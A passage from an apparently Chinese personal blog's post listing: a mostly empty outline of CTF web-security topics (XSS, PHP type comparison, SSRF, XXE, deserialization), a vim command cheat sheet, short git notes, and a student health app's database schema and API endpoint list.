<h3 id="二、xss（跨站脚本攻击）"><a href="#二、xss（跨站脚本攻击）" class="headerlink" title="二、xss（跨站脚本攻击）"></a>二、xss（跨站脚本攻击）</h3><p>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/snad/p/17247840.html">https://www.cnblogs.com/snad/p/17247840.html</a></p>
<h4 id="1-XSS漏洞类型和利用方法"><a href="#1-XSS漏洞类型和利用方法" class="headerlink" title="1.XSS漏洞类型和利用方法"></a>1.XSS漏洞类型和利用方法</h4><h4 id="2-绕过“内容安全策略”"><a href="#2-绕过“内容安全策略”" class="headerlink" title="2.绕过“内容安全策略”"></a>2.绕过“内容安全策略”</h4><h3 id="三、PHP特性攻击"><a href="#三、PHP特性攻击" class="headerlink" title="三、PHP特性攻击"></a>三、PHP特性攻击</h3><h4 id="1-x3D-与-x3D-区别"><a href="#1-x3D-与-x3D-区别" class="headerlink" title="1.=&#x3D;与==&#x3D;区别"></a>1.=&#x3D;与==&#x3D;区别</h4><p>==&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>=&#x3D;在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>1=&#x3D;=true:false<br>1=&#x3D;ture:true</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<br><strong>字符串与数字转换规则</strong>：<br>从遇见的第一位不是数字开始丢弃<br>123admin-&gt;123<br>123a12321-&gt;123</p>
<h4 id="2-MD5验证绕过方法"><a href="#2-MD5验证绕过方法" class="headerlink" title="2.MD5验证绕过方法"></a>2.MD5验证绕过方法</h4><p>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/126834664">https://blog.csdn.net/m0_64815693/article/details/126834664</a></p>
<h3 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h3><h4 id="1-客户端检测绕过方式"><a href="#1-客户端检测绕过方式" class="headerlink" title="1.客户端检测绕过方式"></a>1.客户端检测绕过方式</h4><h4 id="2-MIME类型检测绕过方式"><a href="#2-MIME类型检测绕过方式" class="headerlink" title="2.MIME类型检测绕过方式"></a>2.MIME类型检测绕过方式</h4><h4 id="3-文件后缀检测绕过方式"><a href="#3-文件后缀检测绕过方式" class="headerlink" title="3.文件后缀检测绕过方式"></a>3.文件后缀检测绕过方式</h4><h4 id="4-文件内容检测绕过方式"><a href="#4-文件内容检测绕过方式" class="headerlink" title="4.文件内容检测绕过方式"></a>4.文件内容检测绕过方式</h4><h3 id="五、文件包含"><a href="#五、文件包含" class="headerlink" title="五、文件包含"></a>五、文件包含</h3><h4 id="1-文件包含的函数"><a href="#1-文件包含的函数" class="headerlink" title="1.文件包含的函数"></a>1.文件包含的函数</h4><h4 id="2-读取敏感文件6547"><a href="#2-读取敏感文件6547" class="headerlink" title="2.读取敏感文件6547"></a>2.读取敏感文件6547</h4><h4 id="3-获取服务器权限"><a href="#3-获取服务器权限" class="headerlink" title="3.获取服务器权限"></a>3.获取服务器权限</h4><h3 id="六、远程命令执行"><a href="#六、远程命令执行" class="headerlink" title="六、远程命令执行"></a>六、远程命令执行</h3><h4 id="1-PHP等语言常见的系统命令执行函数"><a href="#1-PHP等语言常见的系统命令执行函数" class="headerlink" title="1.PHP等语言常见的系统命令执行函数"></a>1.PHP等语言常见的系统命令执行函数</h4><p>利用了执行命令函数的参数漏洞<br>mkdir </p>
<h4 id="2-命令拼接方法"><a href="#2-命令拼接方法" class="headerlink" title="2.命令拼接方法"></a>2.命令拼接方法</h4><h4 id="3-绕过过滤机制"><a href="#3-绕过过滤机制" class="headerlink" title="3.绕过过滤机制"></a>3.绕过过滤机制</h4><h3 id="七、服务端请求伪造"><a href="#七、服务端请求伪造" class="headerlink" title="七、服务端请求伪造"></a>七、服务端请求伪造</h3><h4 id="1-SSRF的利用技巧"><a href="#1-SSRF的利用技巧" class="headerlink" title="1.SSRF的利用技巧"></a>1.SSRF的利用技巧</h4><h4 id="2-SSRF攻击mysql"><a href="#2-SSRF攻击mysql" class="headerlink" title="2.SSRF攻击mysql"></a>2.SSRF攻击mysql</h4><h4 id="3-SSRF攻击redis"><a href="#3-SSRF攻击redis" class="headerlink" title="3.SSRF攻击redis"></a>3.SSRF攻击redis</h4><h3 id="八、XML外部实体注入"><a href="#八、XML外部实体注入" class="headerlink" title="八、XML外部实体注入"></a>八、XML外部实体注入</h3><p>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwcdg/p/15913894.html">https://www.cnblogs.com/wwcdg/p/15913894.html</a></p>
<h4 id="1-XML基础知识"><a href="#1-XML基础知识" class="headerlink" title="1.XML基础知识"></a>1.XML基础知识</h4><h4 id="2-绕过过滤机制，实现漏洞利用"><a href="#2-绕过过滤机制，实现漏洞利用" class="headerlink" title="2.绕过过滤机制，实现漏洞利用"></a>2.绕过过滤机制，实现漏洞利用</h4><h3 id="九、NodeJS"><a href="#九、NodeJS" class="headerlink" title="九、NodeJS"></a>九、NodeJS</h3><h4 id="1-javaScrip基本语法"><a href="#1-javaScrip基本语法" class="headerlink" title="1.javaScrip基本语法"></a>1.javaScrip基本语法</h4><h4 id="2-类型污染"><a href="#2-类型污染" class="headerlink" title="2.类型污染"></a>2.类型污染</h4><h4 id="3-原型链污染"><a href="#3-原型链污染" class="headerlink" title="3.原型链污染"></a>3.原型链污染</h4><h3 id="十、反序列化"><a href="#十、反序列化" class="headerlink" title="十、反序列化"></a>十、反序列化</h3><h4 id="1-PHP反序列化漏洞原理"><a href="#1-PHP反序列化漏洞原理" class="headerlink" title="1.PHP反序列化漏洞原理"></a>1.PHP反序列化漏洞原理</h4><h4 id="2-构造POP链"><a href="#2-构造POP链" class="headerlink" title="2.构造POP链"></a>2.构造POP链</h4><h2 id="Reverse（逆向工程）"><a href="#Reverse（逆向工程）" class="headerlink" title="Reverse（逆向工程）"></a>Reverse（逆向工程）</h2><h2 id="PNW（漏洞挖掘与漏洞利用）二进制难"><a href="#PNW（漏洞挖掘与漏洞利用）二进制难" class="headerlink" title="PNW（漏洞挖掘与漏洞利用）二进制难"></a>PNW（漏洞挖掘与漏洞利用）二进制难</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/1a64d2540900.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-15</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/">工具记录</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/vim/">vim</a></span><div class="content"><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/126560108">(96条消息) vim使用教程图文教程（零基础超详细）_士别三日wyx的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/blood_Z/article/details/125064927">(106条消息) vim命令大全_万山寒的博客-CSDN博客</a></p>
<p>vim命令大全<br>1.vim介绍<br>vim编辑器有三种模式：<br>命令模式、编辑模式、末行模式</p>
<p>模式间切换方法：<br>（1）命令模式下，输入:后，进入末行模式<br>（2）末行模式下，按esc慢退、按两次esc快退、或者删除所有命令，可以回到命令模式<br>（3）命令模式下，按下i、a等键，可以计入编辑模式<br>（4）编辑模式下，按下esc，可以回到命令模式</p>
<p>vim打开文件：<br>Vi 使用的选项	说 明<br>vim filename	打开或新建一个文件，并将光标置于第一行的首部<br>vim -r filename	恢复上次 vim 打开时崩溃的文件<br>vim -R filename	把指定的文件以只读方式放入 Vim 编辑器中<br>vim + filename	打开文件，并将光标置于最后一行的首部<br>vi +n filename	打开文件，并将光标置于第 n 行的首部<br>vi +&#x2F;pattern filename	打幵文件，并将光标置于第一个与 pattern 匹配的位置<br>vi -c command filename	在对文件进行编辑前，先执行指定的命令<br>2.命令模式<br>1.光标移动<br>快捷键	功能描述<br>jkhl	基本上下左右<br>gg	光标移动到文档首行<br>G	光标移动到文档尾行<br>^或_	光标移动到行首第一个非空字符<br>home键或0或者g0	光标移动到行首第一个字符<br>g_	光标移动到行尾最后一个非空字符<br>end或或者 g 或者g或者g	光标移动到行尾最后一个字符<br>gm	光标移动到当前行中间处<br>b&#x2F;B	光标向前移动一个单词（大写忽略&#x2F;-等等特殊字符）<br>w&#x2F;W	光标向后移动一个单词（大写忽略&#x2F;-等等特殊字符）<br>e&#x2F;E	移到单词结尾（大写忽略&#x2F;-等等特殊字符）<br>ctrl+b或pageUp键	翻屏操作，向上翻<br>ctrl+f或pageDn键	翻屏操作，向下翻<br>数字+G	快速将光标移动到指定行<br>&#96;.	移动到上次编辑处<br>数字+上下方向键	以当前光标为准，向上&#x2F;下移动n行<br>数字+左右方向键	以当前光标为准，向左&#x2F;右移动n个字符<br>H	移动到屏幕顶部<br>M	移动到屏幕中间<br>L	移动到屏幕尾部<br>z+Enter键	当前行在屏幕顶部<br>z+ .	当前行在屏幕中间<br>z+ -	当前行在屏幕底部<br>shift+6	光标移动到行首<br>shift+4	光标移动到行尾<br>-	移动到上一行第一个非空字符<br>+	移动到下一行第一个非空字符<br>)	向前移动一个句子<br>(	向后移动一个句子<br>}	向前移动一个段落<br>{	向前移动一个段落<br>count l	移动到count 列<br>counth	向左移动count 字符<br>countl	向右移动count字符<br>countgo	移动到count字符<br>2.选中内容<br>快捷键	功能描述<br>v	进行字符选中<br>V 或shift+v	进行行选中<br>gv	选中上一次选择的内容<br>o	光标移动到选中内容另一处结尾<br>O	光标移动到选中内容另一处角落<br>ctr + V	进行块选中<br>3.复制（配合粘贴命令p使用）<br>快捷键	功能描述<br>y	复制已选中的文本到剪贴板<br>n+yy	复制光标所在行，此命令前可以加数字 n，可复制多行<br>yw	复制光标位置的单词<br>ctrl+v + 方向键+yy	ctrl+v，并按方向键选中区块，按下yy复制<br>4.剪切<br>快捷键	功能描述<br>dd	剪切光标所在行<br>数字+dd	以光标所在行为准（包含当前行），向下剪切指定行数<br>D	剪切光标所在行<br>5.粘贴<br>快捷键	功能描述<br>p	将剪贴板中的内容粘贴到光标后<br>P（大写）	将剪贴板中的内容粘贴到光标前<br>6.删除<br>快捷键	功能描述<br>x	删除光标所在位置的字符<br>X(大写)	删除光标前一个字符<br>dd	删除光标所在行，删除之后，下一行上移<br>D	删除光标位置到行尾的内容，删除之后，下一行不上移<br>ndd	删除当前行（包括此行）后 n 行文本<br>dw	移动光标到单词的开头以删除该单词<br>dG	删除光标所在行一直到文件末尾的所有内容<br>:a1,a2d	删除从 a1 行到 a2 行的文本内容<br>7.撤销&#x2F;恢复<br>快捷键	功能描述<br>u	撤销<br>ctrl+r	恢复<br>U(大写)	撤销所有编辑<br>8.字符转换<br>快捷键	功能描述<br>~	转换大小写<br>u	变成小写<br>U	变成大写<br>9.编辑命令的快捷键<br>快捷键	功能描述<br>↑或ctr + p	上一条命令<br>↓或ctr + n	下一条命令<br>ctr + b	移动到命令行开头<br>ctr + e	移动到命令行结尾<br>ctr + ←	向左一个单词<br>ctr + →	向右一个单词<br>3.末行模式(: xxx命令)<br>1.保存&#x2F;退出文件操作<br>命令	功能描述<br>:wq	保存并退出 Vim 编辑器<br>:wq!	保存并强制退出 Vim 编辑器<br>:q	不保存就退出 Vim 编辑器<br>:q!	不保存，且强制退出 Vim 编辑器<br>:w	保存但是不退出 Vim 编辑器<br>:w!	强制保存文本<br>:w filename	另存到 filename 文件<br>x！	保存文本，并退出 Vim 编辑器<br>ZZ	直接退出 Vim 编辑器<br>2.查找：“&#x2F;关键词”<br>在查找结果中，用N、n可以切换上下结果；输入nohl，可以取消高亮</p>
<p>快捷键	功能描述<br>&#x2F;abc	从光标所在位置向前查找字符串 abc<br>&#x2F;^abc	查找以 abc 为行首的行<br>&#x2F;abc$	查找以 abc 为行尾的行<br>?abc	从光标所在位置向后查找字符串 abc<br>n或；	向同一方向重复上次的查找指令<br>N或,	向相反方向重复上次的查找指定<br>3.替换<br>快捷键	功能描述<br>r	替换光标所在位置的字符<br>R	从光标所在位置开始替换字符，其输入内容会覆盖掉后面等长的文本内容，按“Esc”可以结束<br>:s&#x2F;a1&#x2F;a2	替换当前光标所在行第一处符合条件的内容<br>:s&#x2F;a1&#x2F;a2&#x2F;g	替换当前光标所在行所有的 a1 都用 a2 替换<br>:%s&#x2F;a1&#x2F;a2	替换所有行中，第一处符合条件的内容<br>:%s&#x2F;a1&#x2F;a2&#x2F;g	替换所有行中，所有符合条件的内容<br>:n1,n2 s&#x2F;a1&#x2F;a2	将文件中 n1 到 n2 行中第一处 a1 都用 a2 替换<br>:n1,n2 s&#x2F;a1&#x2F;a2&#x2F;g	将文件中 n1 到 n2 行中所有 a1 都用 a2 替换<br>4.行号显示：“: set nu”;<br>行号显示:set nu<br>取消行号显示：:set nonu<br>5.文件切换<br>使用vim打开多个文件后，在末行模式下可以进行切换。</p>
<p>查看当前已经打开的所有文件：:files(%a表示激活状态，#表示上一个打开的文件)<br>切换到指定文件：:open 文件名<br>切换到上一个文(back previous)：:bp<br>切换到下一个文件(back next)：:bn<br>4.编辑模式<br>快捷键	功能描述<br>i	在当前光标所在位置插入，光标后的文本相应向右移动<br>I	在光标所在行的行首插入，行首是该行的第一个非空白字符，相当于光标移动到行首执行 i 命令<br>o	在光标所在行的下插入新的一行。光标停在空行首，等待输入文本<br>O（大写）	在光标所在行的上插入新的一行。光标停在空行的行首，等待输入文本<br>a	在当前光标所在位置之后插入<br>A	在光标所在行的行尾插入，相当于光标移动到行尾再执行 a 命令<br>esc键	退出编辑模式<br>5.扩展<br>1.代码颜色显示：“：syntax on&#x2F;off”</p>
<p>2.vim内置计算器：<br>a.进入编辑模式<br>b.按“ctrl+r，光标变成引号，，输入&#x3D;，光标转到最后一行<br>c.输入需要计算的内容，按下enter后，计算结果回替代上一步中的引号，光标恢复</p>
<p>3.vim的配置<br>a.文件打开时，末行模式下输入的配置为临时配置，关闭文件后配置无效<br>b.修改个人配置文件，可以永久保存个人配置（~&#x2F;.vimrc，如果没有可以自行创建）<br>c.修改全局配置文件，对每个用户生效（vim自带，&#x2F;etc&#x2F;vimrc）</p>
<p>注：个人配置文件优先级更高，当个人配置和全局配置发生冲突时，系统以当前用户的个人配置文件为准</p>
<p>4.异常退出<br>在编辑文件后，未正常保存退出时，会产生异常退出交换文件（.原文件名.swp）<br>将交换文件删除后，再次打开文件时，无提示：“#rm -f .原文件名.swp”</p>
<p>5.别名机制：自定义指令<br>Linux中，存在一个别名映射文件： ~&#x2F;.bashrc<br>修改文件内容，可以自定义指令，重新登录账号后生效</p>
<p>6.文件快捷方式<br>对于深层文件，可以创建文件快捷方式，便于后续操作：#ln -s 源路径 新路径<br>7. 退出方式<br>（1）在vim中退出文件编辑模式，可以使用:q或者:wq<br>（2）建议使用:x：使用效果等同于wq，如果文件有改动则先保存后退出；但是如果文件没有做修改，会直接退出，不会修改文件更新时间，避免用户混淆文件的修改时间<br>————————————————<br>版权声明：本文为CSDN博主「万山寒」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/blood_Z/article/details/125064927">https://blog.csdn.net/blood_Z/article/details/125064927</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/79a5e1d4887a.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-15</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/java%E6%8A%80%E6%9C%AF%E6%A0%88/">java技术栈</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/java%E6%8A%80%E6%9C%AF%E6%A0%88/git/">git</a></span><div class="content"><h2 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h2><p>git clone -b branch http….</p>
<h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>与本地分支同名并且合并<br>git push</p>
<h2 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h2><p>与本地分支同名并且合并<br>git pull</p>
<p>解决冲突<br><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/3721732292/">git如何处理别人的pull request及解决冲突 - 程序员大本营 (pianshen.com)</a></p>
<h1 id="教程链接"><a href="#教程链接" class="headerlink" title="教程链接"></a>教程链接</h1><p><a target="_blank" rel="noopener" href="https://m.php.cn/tool/git/542146.html">git安装后如何拉取gitee代码-git-PHP中文网</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64284147/article/details/121440606">(96条消息) 使用git把项目提交到gitee（命令篇）_如何使用git推送到gitee_Ken_1115的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="http://www.bilibili.com/">www.bilibili.com</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/46d1691adbad.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-11</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/project/">project</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/project/2023%E6%9A%91%E6%9C%9F%E9%A1%B9%E7%9B%AEhealth/">2023暑期项目health</a></span><div class="content"><h1 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>表名：session<br>用途：存储用户的openid，以及sessionid</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>openid</td>
<td>VARCHAR(50)</td>
<td>NOT NULL</td>
<td>保存用户的唯一openid</td>
</tr>
<tr>
<td>sessionid</td>
<td>VARCHAR(50)</td>
<td>NOT NULL</td>
<td>userid</td>
</tr>
</tbody></table>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>表名：user<br>用途：存储用户基本公共信息</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>userid</td>
<td>VARCHAR(50)</td>
<td>PRIMARY KEY</td>
<td>用于唯一标识每个用户的ID号，确保每个用户都有一个唯一的标识符</td>
</tr>
<tr>
<td>username</td>
<td>VARCHAR(50)</td>
<td>NOT NULL</td>
<td>用于存储用户的名字或昵称</td>
</tr>
<tr>
<td>useravatar</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>储存用户头像路径（先存在腾讯存储桶中后存储路径）</td>
</tr>
<tr>
<td>userbirth</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>用于记录用户出生年月日</td>
</tr>
<tr>
<td>usercountry</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 北京</td>
<td>用于记录用户所在地区</td>
</tr>
<tr>
<td>treecount</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>用于记录用户所拥有的树木数量</td>
</tr>
<tr>
<td>energycount</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>用于记录用户所拥有的能量值，每天更新</td>
</tr>
</tbody></table>
<h2 id="trends"><a href="#trends" class="headerlink" title="trends"></a>trends</h2><table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>userid</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>用户唯一标识</td>
</tr>
<tr>
<td>words</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>动态文本</td>
</tr>
<tr>
<td>pictures</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>动态图片</td>
</tr>
<tr>
<td>lasttime</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>上传时间</td>
</tr>
</tbody></table>
<p>表名：tantrends<br>用途：存储用户的碳排放打卡动态</p>
<p>表名：foodtrends<br>用途：存储用户的光盘打卡动态</p>
<p>表名：rubbishtrends<br>用途：存储用户的垃圾分类打卡动态</p>
<h2 id="food"><a href="#food" class="headerlink" title="food"></a>food</h2><p>表名：food<br>用途：存储食谱</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>foodname</td>
<td>VARCHAR(50)</td>
<td>PRIMARY KEY</td>
<td>食物名称</td>
</tr>
<tr>
<td>foodpicture</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>食物图片</td>
</tr>
<tr>
<td>foodcalorie</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>食物卡路里</td>
</tr>
</tbody></table>
<h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><p>表名：task<br>用途：记录每日打卡任务</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>energy</td>
<td>INT</td>
<td>DEFAULT</td>
<td>任务能量值</td>
</tr>
<tr>
<td>words</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>任务描述</td>
</tr>
<tr>
<td>answer</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>任务答案:[a,b,c]</td>
</tr>
<tr>
<td>任务类型：</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>问答型</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>题目+答案</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>前端请求task表，获取每日打卡任务</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>用户作答打卡后，记录下用户作答情况:如一共五题，打卡了前三题，则向后端传[1,1,1,0,0]，以及增加的能量值（每打卡一题传一次）</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="usertask"><a href="#usertask" class="headerlink" title="usertask"></a>usertask</h2><p>表名：usertask<br>用途：记录用户每日打卡任务情况</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>userid</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>用户唯一标识</td>
</tr>
<tr>
<td>situation</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>打卡情况，每日更新为null,[1,0,1]</td>
</tr>
</tbody></table>
<h1 id="后端接口列表"><a href="#后端接口列表" class="headerlink" title="后端接口列表"></a>后端接口列表</h1><h2 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h2><p><strong>post方法</strong>*<br><strong>地址</strong><br><a target="_blank" rel="noopener" href="http://47.120.14.52:8081/login">http://47.120.14.52:8081/login</a><br><strong>参数：</strong><br>code<br><strong>返回值</strong><br>返回user信息以及sessionid<br>sessionid用于校验用户身份</p>
<h2 id="更新用户信息接口"><a href="#更新用户信息接口" class="headerlink" title="更新用户信息接口"></a>更新用户信息接口</h2><p><strong>post方法</strong><br><strong>地址：</strong><br><a target="_blank" rel="noopener" href="http://47.120.14.52:8081/updatauser">http://47.120.14.52:8081/updatauser</a><br><strong>参数</strong><br>必须参数：sessionid<br>可选参数：username、userarea、useravatar、userdate（日期字符串格式1991-01-01）<br><strong>返回值：</strong><br>更新后的user信息</p>
<h2 id="动态接口"><a href="#动态接口" class="headerlink" title="动态接口"></a>动态接口</h2><h2 id="上传动态"><a href="#上传动态" class="headerlink" title="上传动态"></a>上传动态</h2><p>地址：\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/up">http://47.120.14.52:8081/trends/up</a><br>header:{“sessionid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}<br>raw:{</p>
<p>   “username”:”最新name”,</p>
<p>   “useravatar”:”bb”,</p>
<p>   “words”:”bc”,</p>
<p>   “pictures”:[“bd”,”wed”,”wedw”],</p>
<p>   “lasttime”:”1039-02-02 14:34:54”</p>
<p>}</p>
<h2 id="获取动态"><a href="#获取动态" class="headerlink" title="获取动态"></a>获取动态</h2><h3 id="大厅展示"><a href="#大厅展示" class="headerlink" title="大厅展示"></a>大厅展示</h3><p>地址:\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/findbypage">http://47.120.14.52:8081/trends/findbypage</a><br>header:{“sessionid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}<br>raw:{</p>
<p>    “page”:1,</p>
<p>    “size”:2</p>
<p>}</p>
<h3 id="个人仓库动态展示"><a href="#个人仓库动态展示" class="headerlink" title="个人仓库动态展示"></a>个人仓库动态展示</h3><p>设计思路：<br>在大厅的方法中加入sessionid查询<br>地址:\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/findselfbypage">http://47.120.14.52:8081/trends/findselfbypage</a><br>header:{“sessionid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}<br>raw:{</p>
<p>    “page”:1,</p>
<p>    “size”:2</p>
<p>}</p>
<h2 id="删除动态"><a href="#删除动态" class="headerlink" title="删除动态"></a>删除动态</h2><p>设计思路：<br>只有用户自己可以删除自己的动态<br>先进行用户检查，确保在数据库中<br>将用户sessionid与删除动态的userid对应<br>若一致则删除<br>若不一致，显示无权限删除</p>
<p>地址:\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/rmv">http://47.120.14.52:8081/trends/rmv</a><br>header:{“sessionid”,”trendid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}</p>
<h2 id="每日打卡"><a href="#每日打卡" class="headerlink" title="每日打卡"></a>每日打卡</h2><h1 id="项目提升"><a href="#项目提升" class="headerlink" title="项目提升"></a>项目提升</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>前端传code+appid+appsecret</p>
<p>后端</p>
<ol>
<li>接收code+appid+appsecret</li>
<li>在接受方法内调用登录凭证校验接口获取appid</li>
<li>新建一张用户表存放appid+sessionid，appid对应userid</li>
</ol>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>使用Spring Security 做权限控制，替代拦截器的拦截控制，并使用自己的认证方案替代Security认证流程,使<br>权限认证和控制更加方便灵活。<br>使用Redis的set实现点赞, zset 实现关注，并使用Redis存储登录ticket和验证码，解决分布式session问<br>题。<br>使佣Redis高级数据类型HyperLogLog统计UV(Unique Visitor),使用Bitmap统计DAU (Daily Active User)。<br>使用Kafka处理发送评论、点赞和关注等系统通知，并使用事件进行封装，构建了强大的异步消息系统。<br>使用Elasticsearch做全局搜索，并通过事件封装，增加关键词高亮显示等功能。<br>对热帖排行模块，使用分布式缓存Redis和本地缓存Caffeine作为多级缓存,避免了缓存雪崩，将QPS提升了<br>20倍(10-200)，大大提升了网站访问速度。并使用Quartz定时更新热帖排行。</p>
<p>使用 Kafka 处理发送评论、点赞和关注等系统通知，并使用事件进行封装，构建了强大的异步消息系统。</p>
<p>技术栈: SpringBoot+ SpringCloud+ Redis + Kafka+XXL-Job+Vue.js+其他第三方SDK等<br>●将校内服务与百度地图结合实现信息视觉呈现;采用人脸识别打造安全机制，通过模型训练数据采集提供了智<br>能系统问<br>答服务<br>●对系统慢SQL进行优化，使得系统性能大幅度提高。<br>●用Redis存储登录ticket和验证码，解决分布式session问题<br>●定义热点数据并缓存在Redis,降低了数据库访问压力<br>●将校内服务与百度地图结合实现信息视觉呈现;采用人脸识别打造安全机制，通过模型训练数据采集提供了智<br>能系统问<br>答服务<br>●对热帖排行模块，使用分布式缓存Redis和本地缓存Caffeine作为多级缓存，避免了缓存雪崩，将QPS提升了<br>20倍<br>(10-200)，大大提升了网站访问速度。并使用Quartz定时更新热帖排行<br>●利用JVM指令排查出GC问题，调整JVM配置，降低GC次数使<br>●用Kafka打造强大的异步消息系统<br>version1.0可以公众号后台回复[基于人工智能的智慧校园助手]</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/66d03afcf0b4.html">测试</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-18</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/Python/">Python</a></span><div class="content"><h2 id="考试题型"><a href="#考试题型" class="headerlink" title="考试题型"></a>考试题型</h2><p>满分 100 